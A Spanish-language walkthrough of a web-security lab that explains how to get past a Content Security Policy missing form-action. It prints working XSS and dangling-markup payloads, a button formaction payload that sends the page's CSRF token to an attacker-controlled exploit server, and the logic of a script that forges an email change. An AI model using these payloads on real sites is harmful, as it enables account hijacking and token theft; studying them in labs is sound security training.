### Fase 1: Descubrir el punto de inyección (pasos 1-5)

1. **Login** con `wiener:peter`.
2. En “change email” pruebas un payload típico (`<img src onerror=alert(1)>`) y ves que la **validación del cliente** (JavaScript del formulario) lo bloquea antes de enviarlo.
3. Con DevTools inspeccionas el `<input type="email">`. Dos hallazgos clave:
    - Si cambias `type="email"` a `type="text"`, el navegador deja de validar el formato, así te dejará meter caracteres raros.
    - Hay un `<input hidden>` con un **token CSRF** — esto te dice que el endpoint que cambia el email está protegido contra CSRF, así que más adelante necesitarás ese token.
4. Envías `foo@example.com"><img src= onerror=alert(1)>` — un email “válido” seguido de tu payload, cerrando el atributo `value="..."` con `">`.
5. El servidor refleja tu input pero **lo escapa correctamente** (no se ejecuta). Esto confirma que el servidor sanitiza bien... pero no dice nada sobre otros parámetros de la app.

### Fase 2: Encontrar el XSS real (pasos 6-8)

6-7. Pruebas el mismo truco pero con el parámetro **`?email=`** en la URL (`/my-account?email=<img src onerror=alert(1)>`). Aquí sí se refleja el XSS **sin escapar**, pero el `alert(1)` no se dispara.

8. Miras la consola de DevTools y ves un error de **CSP** bloqueando el script inline. O sea: el XSS existe, pero el CSP lo neutraliza. Objetivo ahora: **evadir el CSP**, no el filtro de sanitización (porque ya no hay ninguno en este parámetro).

### Fase 3: Entender la debilidad del CSP (concepto clave)

La política CSP de este lab es estricta en cuanto a `script-src` (bloquea JS inline y externo), pero **le falta la directiva `form-action`**. Eso significa que aunque no puedas ejecutar JavaScript, sí puedes **inyectar HTML** que controle hacia dónde se envía un `<form>` — en concreto, un botón con el atributo `formaction`, que puede redirigir el envío de _cualquier_ formulario de la página (incluido el de “change email”) a un servidor externo que tú controlas.

Esto es “dangling markup” / **form hijacking**: no ejecutas JS, secuestras el comportamiento de un formulario existente mediante HTML puro.

### Fase 4: Inyectar el botón malicioso (pasos 9-13)

9. Copias la URL de tu **exploit server** (un dominio que SÍ controlas, provisto por el lab).

10-12. Inyectas vía el parámetro `email`:

```
?email=foo@bar"><button formaction="https://TU-EXPLOIT-SERVER/exploit">Click me</button>
```

- `foo@bar"` cierra el atributo `value` del input original.
- `>` cierra la etiqueta `<input>`.
- El `<button formaction="...">` queda como un elemento nuevo en la página, **dentro del `<form>` de “change email”**. En HTML, un botón con `formaction` sobreescribe el `action` del formulario _solo para ese botón_, cuando se hace clic.

13. Al pulsar el botón, el formulario (con el token CSRF y el campo email incluidos) se envía a tu exploit server en lugar de al servidor legítimo. Confirmas que el ataque funciona, aunque el CSRF token va en el body (POST), no visible.

### Fase 5: Capturar el token CSRF (pasos 14-16)

Necesitas ver el token para poder reutilizarlo en tu propio request falsificado. Añades `formmethod="get"` al botón:

```
?email=foo@bar"><button formaction="https://TU-EXPLOIT-SERVER/exploit" formmethod="get">Click me</button>
```

Con GET, los datos del form (incluido `csrf=...`) van en la **query string**, así que al hacer clic, el navegador de la víctima te envía el token directamente en la URL de tu exploit server — y tú (atacante) lo puedes leer ahí.

### Fase 6: Automatizar el ataque completo (paso 17 en adelante)

Ahora construyes un script que la víctima ejecutará automáticamente al visitar tu exploit server (sin que tenga que hacer clic dos veces). La lógica es:

- **Si la URL actual ya trae `?csrf=...`** (es decir, la víctima ya pasó por el paso de “fuga” del token): extraes el token con `URLSearchParams`, construyes dinámicamente un `<form>` oculto con `email=hacker@evil-user.net` y el `csrf` robado, y lo envías automáticamente por POST a `/my-account/change-email`.
- **Si NO hay token todavía** (primera visita): rediriges al navegador de la víctima a la URL del lab con el payload que inyecta el botón `formaction` + `formmethod=get`, para “sacarle” el token.

Esto resuelve el problema del flujo en dos pasos: la víctima solo necesita cargar tu página del exploit server **una vez**, pero internamente el script hace el ciclo completo: (1) si no tiene token, lo va a buscar vía el formulario hijacked; (2) cuando vuelve con el token en la URL, lo usa para falsificar el cambio de email.
